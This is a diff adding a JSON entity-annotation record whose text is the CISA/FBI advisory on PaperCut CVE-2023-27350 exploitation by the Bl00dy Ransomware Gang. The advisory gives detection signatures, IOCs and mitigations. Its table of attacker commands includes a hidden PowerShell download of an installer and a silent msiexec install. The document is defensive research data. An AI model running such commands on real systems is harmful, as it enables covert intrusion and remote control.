@@ -1,0 +1,173 @@
+{
+  "doc_id": "aa23-131a",
+  "schema_version": "chapter3-no-capec-v1",
+  "annotation_protocol_version": "4.6-mcpu-mention-fact-dual-layer-v1",
+  "annotation_status": "v4.5_human_reannotated_adjudicated",
+  "gold_review": {
+    "kind": "human reannotation and adjudication",
+    "formal_human_iaa": false,
+    "prediction_outputs_used": false,
+    "configuration_boundary": {
+      "version": "configuration-mcpu-v2",
+      "prediction_outputs_used": false,
+      "policy_file": "config/configuration_boundary_mcpu_v2.json"
+    }
+  },
+  "notes": "",
+  "text": "Malicious Actors Exploit CVE-2023-27350 in PaperCut MF and NG | CISA\nSkip to main content\n \nOfficial websites use .gov\n A \n.gov\n website belongs to an official government organization in the United States.\nSecure .gov websites use HTTPS\n A \nlock\n (\n) or \nhttps://\n means you’ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\nStaying Secure at Events\nno-cost Cyber Services\nSecure by design \nSecure Your Business\nReport A Cyber Issue\n \nShare:\nCybersecurity Advisory\nMalicious Actors Exploit CVE-2023-27350 in PaperCut MF and NG\nLast Revised\nMay 11, 2023\nAlert Code\nAA23-131A\n Related topics:\nMalware, Phishing, and Ransomware\n ,\nCyber Threats and Response\n ,\nSecuring Networks\nSUMMARY\nThe Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) in response to the active exploitation of \nCVE-2023-27350\n. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF and enables an unauthenticated actor to execute malicious code remotely without credentials. PaperCut released a patch in March 2023.\nAccording to FBI observed information, malicious actors exploited CVE-2023-27350 beginning in mid-April 2023 and continuing through the present. In early May 2023, also according to FBI information, a group self-identifying as the Bl00dy Ransomware Gang attempted to exploit vulnerable PaperCut servers against the Education Facilities Subsector.\nThis joint advisory provides detection methods for exploitation of CVE-2023-27350 as well and indicators of compromise (IOCs) associated with Bl00dy Ransomware Gang activity. FBI and CISA strongly encourage users and administrators to immediately apply patches, and workarounds if unable to patch. FBI and CISA especially encourage organizations who did not patch immediately to assume compromise and hunt for malicious activity using the detection signatures in this CSA. If potential compromise is detected, organizations should apply the incident response recommendations included in this CSA.\nDownload the PDF version of this report (653kb):\nAA23-131A_Malicious_Actors_Exploit_CVE-2023-27350_in_PapercCut_MF_and_NG.pdf\n(PDF, 652.93 KB\n )\nFor a downloadable copy of IOCs (55kb), see:\nAA23-131A.STIX_.XML\n(XML, 54.98 KB\n )\nTECHNICAL DETAILS\nVulnerability Overview\nCVE-2023-27350\n allows a remote actor to bypass authentication and conduct remote code execution on the following affected installations of PaperCut:[\n1\n]\nVersion 8.0.0 to 19.2.7\nVersion 20.0.0 to 20.1.6\nVersion 21.0.0 to 21.2.10\nVersion 22.0.0 to 22.0.8\nPaperCut servers vulnerable to CVE-2023-27350 implement improper access controls in the SetupCompleted Java class, allowing malicious actors to bypass user authentication and access the server as an administrator. After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software:\nUsing the print scripting interface to execute shell commands.\nUsing the User/Group Sync interface to execute a living-off-the-land-style attack.\nFBI and CISA note that actors may develop other methods for RCE.\nThe PaperCut server process \npc-app.exe\n runs with SYSTEM- or root-level privileges. When the software is exploited to execute other processes such as \ncmd.exe\n or \npowershell.exe\n, these child processes are created with the same privileges. Commands supplied with the execution of these processes will also run with the same privileges. As a result, a wide range of post-exploitation activity is possible following initial access and compromise.\nThis CVE was added to CISA’s \nKnown Exploited Vulnerabilities (KEV) Catalog\n on April 21, 2023.\nThreat Actor Activity\nEducation Facilities Subsector entities maintained approximately 68% of exposed, but not necessarily vulnerable, U.S.-based PaperCut servers. In early May 2023, according to FBI information, the Bl00dy Ransomware Gang gained access to victim networks across the Education Facilities Subsector where PaperCut servers vulnerable to CVE-2023-27350 were exposed to the internet. Ultimately, some of these operations led to data exfiltration and encryption of victim systems. The Bl00dy Ransomware Gang left ransom notes on victim systems demanding payment in exchange for decryption of encrypted files (see Figure 1).\n \nFigure 1: Example Bl00dy Gang Ransomware Note\nAccording to FBI information, legitimate remote management and maintenance (RMM) software was downloaded and executed on victim systems via commands issued through PaperCut’s print scripting interface. External network communications through Tor and/or other proxies from inside victim networks helped Bl00dy Gang ransomware actors mask their malicious network traffic. The FBI also identified information relating to the download and execution of command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons, although it is unclear at which stage in the attack these tools were executed.\nDETECTION METHODS\nNetwork defenders should focus detection efforts on three key areas:\nNetwork traffic signatures – Look for network traffic attempting to access the \nSetupCompleted\n page of an exposed and vulnerable PaperCut server.\nSystem monitoring – Look for child processes spawned from a PaperCut server’s \npc-app.exe\n process.\nServer settings and log files – Look for evidence of malicious activity in PaperCut server settings and log files.\nNetwork Traffic Signatures\nTo exploit CVE-2023-27350, a malicious actor must first visit the \nSetupCompleted\n page of the intended target, which will provide the adversary with authentication to the targeted PaperCut server. Deploy the following \nEmerging Threat Suricata signatures\n to detect when \nGET\n requests are sent to the \nSetupCompleted\n page. (Be careful of improperly formatted double-quotation marks if copying and pasting signatures from this advisory.)\nNote that some of the techniques identified in this section can affect the availability or stability of a system. Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while threat hunting. \nalert http any any -> $HOME_NET any (\\\n  msg:\"ET EXPLOIT PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)\"; \\\n  flow:established,to_server; \\\n  http.method; content:\"GET\"; \\\n  http.uri; content:\"/app?service=page/SetupCompleted\"; bsize:32; fast_pattern; \\\n  reference:cve,2023-27350; \\\n  classtype:attempted-admin; \\\nalert http any any -> $HOME_NET any (msg:\"ET EXPLOIT PaperCut MF/NG SetupCompleted Authentication Bypass (CVE-2023-27350)\"; flow:established,to_server; http.method; content:\"GET\"; http.uri; content:\"page/SetupCompleted\"; fast_pattern; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; reference:cve,2023-27350; classtype:attempted-admin; metadata:attack_target Server, cve CVE_2023_27350, deployment Perimeter, deployment Internal, deployment SSLDecrypt, former_category EXPLOIT, performance_impact Low, confidence High, signature_severity Major, updated_at 2023_05_05;)\nNote that these signatures and other rule-based detections, including YARA rules, \nmay fail\n to detect more advanced iterations of CVE-2023-27350 exploits. Actors are known to adapt exploits to circumvent rule-based detections formulated for the original iterations of exploits observed in the wild. For example, the first rule above detected some of the first known exploits of CVE-2023-27350, but a slight modification of the exploit’s GET request can evade that rule. The second rule was designed to detect a broader range of activity than the first rule.\nThe following additional \nEmerging Threat Suricata signatures\n are designed to detect Domain Name System (DNS) lookups of known malicious domains associated with recent PaperCut exploitation:\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowcsupdates .com)\"; dns_query; content:\"windowcsupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowcsupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdate .com)\"; dns_query; content:\"anydeskupdate.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdate\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (anydeskupdates .com)\"; dns_query; content:\"anydeskupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)anydeskupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecemter .com)\"; dns_query; content:\"windowservicecemter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecemter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET ATTACK_RESPONSE Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (winserverupdates .com)\"; dns_query; content:\"winserverupdates.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)winserverupdates\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (netviewremote .com)\"; dns_query; content:\"netviewremote.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)netviewremote\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (updateservicecenter .com)\"; dns_query; content:\"updateservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)updateservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecenter .com)\"; dns_query; content:\"windowservicecenter.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecenter\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category MALWARE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nalert dns $HOME_NET any -> any any (msg:\"ET TROJAN Possible PaperCut MF/NG Post Exploitation Domain in DNS Lookup (windowservicecentar .com)\"; dns_query; content:\"windowservicecentar.com\"; nocase; isdataat:!1,relative; pcre:\"/(?:^|\\.)windowservicecentar\\.com$/\"; reference:url,www.huntress.com/blog/critical-vulnerabilities-in-papercut-print-management-software; classtype:trojan-activity; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, deployment Perimeter, former_category ATTACK_RESPONSE, performance_impact Low, signature_severity Major, updated_at 2023_04_21;)\nNote that these signatures may also not work if the actor modified activity to evade detection by known rules.\nSystem Monitoring\nA child process is spawned under \npc-app.exe\n when the vulnerable PaperCut software is used to execute another process, which is the PaperCut server process. Malicious activity against PaperCut servers in mid-April used the RCE to supply commands to a \ncmd.exe\n or \npowershell.exe\n child process, which were then used to conduct further network exploitation. The following YARA rule may detect malicious activity[\n2\n].\ntitle: PaperCut MF/NG Vulnerability \nauthors: Huntress DE&TH Team\ndescription: Detects suspicious code execution from vulnerable PaperCut versions MF and NG \nlogsource:\n  category: process_creation \n  product: windows \ndetection: \n  selection: \n    ParentImage|endswith: “\\\\pc-app.exe” \n    Image|endswith:  \n      - “\\\\cmd.exe” \n      - “\\\\powershell.exe” \n  condition: selection \nlevel: high \nfalsepositives:     \n  - Expected admin activity\nMore advanced versions of the exploit can drop a backdoor executable, use living-off-the-land binaries, or attempt to evade the above YARA rule by spawning an additional child process in-between \npc-app.exe\n and a command-line interpreter.\nServer Settings and Log Files\nNetwork defenders may be able to identify suspicious activity by reviewing the PaperCut server options to identify unfamiliar print scripts or User/Group Sync settings.\nIf the PaperCut Application Server logs have debug mode enabled, lines containing \nSetupCompleted\n at a time not correlating with the server installation or upgrade may be indicative of a compromise. Server logs can be found in \n[app-path]/server/logs/*.*\n where \nserver.log\n is normally the most recent log file.\nAny of the following server log entries may be indicative of a compromise:\nUser \"admin\" updated the config key “print.script.sandboxed”\nUser \"admin\" updated the config key “device.script.sandboxed”\nAdmin user \"admin\" modified the print script on printer\nUser/Group Sync settings changed by \"admin\"\nIndicators of Compromise\nSee Table 1 through Table 6 for IOCs obtained from FBI investigations and open-source information as of early May 2023.\nTable 1: Bl00dy Gang Ransomware Email Addresses\nEmail Addresses\ndecrypt.support@privyonline[.]com\nfimaribahundqf@gmx[.]com\nmain-office@data-highstream[.]com\nprepalkeinuc0u@gmx[.]com\ntpyrcne@onionmail[.]org\n \nTable 2: Bl00dy Gang Ransomware Tox ID\nTox ID\nE3213A199CDA7618AC22486EFECBD9F8E049AC36094D56AC1BFBE67EB9C3CF2352CAE9EBD35F\n \nTable 3: Bl00dy Gang Ransomware IP addresses\nIP Address\nPort\n>\nDate\nDescription\n102.130.112[.]157\n-\nApril 2023\nN/A\n172.106.112[.]46\n-\nApril 2023\nResolves to Tor node. Network communications with \nnethelper.exe\n.\n176.97.76[.]163\n-\nApril 2023\nResolves to datacenter Tor node.\n192.160.102[.]164\n \n \nApril 2023\nResolves to Tor node. Network communications with \nnethelper.exe\n.\n194.87.82[.]7\n-\nApril 2023\nTrueBot C2. DiceLoader malware.\n195.123.246[.]20\n-\nApril 2023\nTrueBot C2. DiceLoader malware.\n198.50.191[.]95\n \n \nApril 2023\nResolves to Tor node. Network communications with \nnethelper.exe\n.\n206.197.244[.]75\n>443\nApril 2023\nN/A\n216.122.175[.]114\n \n \nApril 2023\nOutbound communications from \npowershell.exe\n.\n46.4.20[.]30\n \nApril 2023\nResolves to Tor node. Network communications with \nnethelper.exe\n.\n5.188.206[.]14\n-\nApril 2023\nN/A\n5.8.18[.]233\n-\nApril 2023\nCobalt Strike C2.\n5.8.18[.]240\n-\nApril 2023\nCobalt Strike C2.\n80.94.95[.]103\n-\nApril 2023\nN/A\n89.105.216[.]106\n443\nApril 2023\nResolves to Tor node. Network communications with \nnethelper.exe\n.\n92.118.36[.]199\n9100, 443\nApril 2023\nOutbound communications from \nsvchost.exe\n.\nhttp://192.184.35[.]216:443/\n4591187629.exe\n-\nApril 2023\nFile \n4591187629.exe\n is possibly cryptominer malware.\n \nTable 4: Bl00dy Gang Ransomware Domains\nMalicious Domain\nDescription\nanydeskupdate[.]com\nN/A\nanydeskupdates[.]com\nN/A\nber6vjyb[.]com\nAssociated with TrueBot C2\nnetviewremote[.]com\nN/A\nstudy.abroad[.]ge\nAssociated with Cobalt Strike Beacon\nupd343.winserverupdates[.]com\nAssociated with Cobalt Strike Beacon\nupd488.windowservicecemter[.]com\nAssociated with TrueBot payload\nupd488.windowservicecemter[.]com/download/update.dll\nFile: Cobalt Strike Beacon\nupdateservicecenter[.]com\nN/A\nwindowcsupdates[.]com\nN/A\nwindowservicecemter[.]com\nAssociated with TrueBot payload\nwindowservicecentar[.]com\nN/A\nwindowservicecenter[.]com\nN/A\nwinserverupdates[.]com\nN/A\nwinserverupdates[.]com\nN/A\n \nTable 5: Bl00dy Gang Ransomware Known Commands\nCommand\nDescription\ncmd /c “powershell.exe -nop -w hidden\nLaunches \npowershell.exe\n in a hidden window without loading the user's PowerShell profile.\nInvoke-WebRequest ‘<url>/setup.msi’\n -OutFile ‘setup.msi’ ”\nDownloads \nsetup.msi\n, saving it as \nsetup.msi\n, in the current PowerShell working directory.\ncmd /c “msiexec /i setup.msi /qn  IntegratorLogin=<email_address> CompanyId=1”\nInstalls legitimate Atera RMM software on the system silently, with the specified email address and company ID properties.\n \nTable 6: Bl00dy Gang Ransomware Malicious Files\nFile\nSHA-256\nDescription\n/windows/system32/config/\nsystemprofile/appdata/roaming/tor/\nN/A\nUnspecified files created in Tor directory\n/windows/temp/\nsocks.exe\n6bb160ebdc59395882ff322e67e000a22a5c54ac777b6b1f10f1fef381df9c15\nReverse SOCKS5 tunneler with TLS support (see \nhttps://github.com/kost/revsocks\n)\n/windows/temp/servers.txt\nN/A\nUnspecified content within servers.txt file; likely a list of proxy servers for \nrevsocks(socks.exe)\nld.txt\nc0f8aeeb2d11c6e751ee87c40ee609aceb1c1036706a5af0d3d78738b6cc4125\nTrueBot malware\nnethelper.exe\nN/A\nUnknown file used to send outbound communications through Tor\nupdate.dll\n0ce7c6369c024d497851a482e011ef1528ad270e83995d52213276edbe71403f\nCobalt Strike Beacon\nINCIDENT RESPONSE\nIf compromise is suspected or detected, organizations should:\nCreate a backup of the current PaperCut server(s).\nWipe the PaperCut Application Server and/or Site Server and rebuild it.\nRestore the database from a “safe” backup point. Using a backup dated prior to April 2023 would be prudent, given that exploitation in-the-wild exploitation began around early April.\nExecute additional security response procedures and carry out best practices around potential compromise.\nReport the compromise to CISA via CISA’s 24/7 Operations Center (\nreport@cisa.gov\n or 1-844-Say-CISA). The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their \nlocal FBI field office\n or \nIC3.gov\n. Regarding specific information that appears in this communication, the context and individual indicators, particularly those of a non-deterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of a compromise. Indicators should always be evaluated in light of an organization’s complete information security situation. \nMITIGATIONS\nFBI and CISA recommend organizations:\nUpgrade PaperCut to the latest version.\nIf unable to immediately patch, ensure vulnerable PaperCut servers are not accessible over the internet\n and implement one of the following network controls:\nOption 1: External controls: Block all inbound traffic from external IP addresses to the web management portal (port 9191 and 9192 by default).\nOption 2: Internal and external controls: Block all traffic inbound to the web management portal. Note: The server cannot be managed remotely after this step.\nFollow best cybersecurity practices\n in your production and enterprise environments, including mandating \nphishing-resistant multifactor authentication (MFA)\n for all staff and for all services. For additional best practices, see CISA’s \nCross-Sector Cybersecurity Performance Goals\n (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of IT and OT security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and FBI also recommend all organizations implement a comprehensive information security program based on a recognized framework, such as the \nNIST Cybersecurity Framework\n (CSF).\nACKNOWLEDGMENTS\nThe Multi-State Information Sharing and Analysis Center (MS-ISAC) contributed to this advisory.\nREFERENCES\n[1] PaperCut: \nURGENT | PaperCut MF/NG vulnerability bulletin (March 2023)\n[2] Huntress: \nCritical Vulnerabilities in PaperCut Print Management Software\nThis product is provided subject to this \nNotification\n and this \nPrivacy & Use\n policy.\nThis product is provided subject to this \nNotification\n and this \nPrivacy & Use\n policy.\nTags\nAudience\n:\n Educational Institutions\nCo-Sealers and Partners\n:\n Federal Bureau of Investigation\nTopics\n:\nCyber Threats and Response\n,\nMalware, Phishing, and Ransomware\n,\nSecuring Networks\nPlease share your thoughts\nWe recently updated our anonymous \nproduct survey\n; we welcome your feedback.\nRelated Advisories\nJul 31, 2025\nCybersecurity Advisory | AA25-212A\nCISA and USCG Identify Areas for Cyber Hygiene Improvement After Conducting Proactive Threat Hunt at US Critical Infrastructure Organization\n \nJul 22, 2025\nCybersecurity Advisory | aa25-203a\n#StopRansomware: Interlock\n \nMay 21, 2025\nCybersecurity Advisory | AA25-141B\nThreat Actors Deploy LummaC2 Malware to Exfiltrate Sensitive Data from Organizations\n \nMar 12, 2025\nCybersecurity Advisory | AA25-071A\n#StopRansomware: Medusa Ransomware",
+  "entities": [
+    {
+      "id": "E1",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 25,
+      "end": 39,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E2",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 544,
+      "end": 558,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E3",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 937,
+      "end": 951,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E4",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 1231,
+      "end": 1245,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E5",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 1579,
+      "end": 1593,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E6",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 2193,
+      "end": 2207,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E7",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 2378,
+      "end": 2392,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E8",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 2664,
+      "end": 2678,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E9",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 4178,
+      "end": 4192,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E10",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 5613,
+      "end": 5627,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E11",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 6409,
+      "end": 6423,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E12",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 6742,
+      "end": 6756,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E13",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 7388,
+      "end": 7402,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E14",
+      "type": "Vulnerability",
+      "text": "CVE-2023-27350",
+      "start": 7636,
+      "end": 7650,
+      "normalized_id": "CVE-2023-27350"
+    },
+    {
+      "id": "E16",
+      "type": "Configuration",
+      "text": "PaperCut NG",
+      "start": 1003,
+      "end": 1014,
+      "normalized_id": "cpe:2.3:a:papercut:papercut_ng:*:*:*:*:*:*:*:*",
+      "evidence": "CVE-2023-27350\n. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF"
+    },
+    {
+      "id": "E17",
+      "type": "Configuration",
+      "text": "PaperCut MF",
+      "start": 1019,
+      "end": 1030,
+      "normalized_id": "cpe:2.3:a:papercut:papercut_mf:*:*:*:*:*:*:*:*",
+      "evidence": "CVE-2023-27350\n. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF"
+    }
+  ],
+  "relations": [
+    {
+      "id": "R1",
+      "type": "affects",
+      "head": "E3",
+      "tail": "E16",
+      "evidence": "CVE-2023-27350\n. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF",
+      "evidence_start": 937,
+      "evidence_end": 1030,
+      "adjudication_basis": "same sentence explicitly lists PaperCut NG as an affected product"
+    },
+    {
+      "id": "R2",
+      "type": "affects",
+      "head": "E3",
+      "tail": "E17",
+      "evidence": "CVE-2023-27350\n. This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF",
+      "evidence_start": 937,
+      "evidence_end": 1030,
+      "adjudication_basis": "same sentence explicitly lists PaperCut MF as an affected product"
+    }
+  ],
+  "boundary_contract_version": "chapter3-boundary-sync-v2"
+}
